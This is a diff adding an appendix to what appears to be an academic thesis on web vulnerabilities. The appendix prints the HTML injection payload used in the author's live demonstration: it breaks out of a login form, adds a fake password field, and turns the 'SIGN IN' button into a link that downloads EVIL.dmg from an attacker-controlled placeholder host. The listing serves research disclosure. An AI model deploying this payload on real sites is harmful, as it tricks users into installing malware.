@@ -1,2 +1,33 @@
 \appendix
-\chapter{First Appendix}
+\chapter{Appendix}
+
+\section{Exploit Code} \label{exploitCode}
+
+In the following listing, we include the code used to generate the exploit as seen in Section \ref{live_vulnerability}. In the Listing, \texttt{MY\_CONTROLLED\_SITE} is the domain of a website we control, with the purpose of hosting the \texttt{EVIL.dmg} file.
+
+\begin{lstlisting}[label={lst:exploit_code}, language={HTML}]
+"></form>
+<div style="height:6px; width:100%; clear:both;"></div>
+<form>
+	<div class="form-group">
+		<label class="control-label" for="password">PASSWORD</label>
+		<input class="form-control" type="password" name="LoginForm[password]" placeholder="Password" >
+	</div>
+	<style>
+		.myanchor {
+			display: block;
+			width: 310px;
+			height: 40px;
+			background: #4E9CAF !important;
+			padding: 10px;
+			text-align: center;
+			border-radius: 5px;
+			font-weight: bold;
+		}
+	</style>
+	<div class="form-group btn-container">
+		<a href="http://MY_CONTROLLED_SITE/test/EVIL.dmg" class="myanchor" type="submit" ><i class="fa fa-sign-in fa-lg fa-fw"></i>SIGN IN</a>
+	</div>
+</form></section></body>
+
+\end{lstlisting}
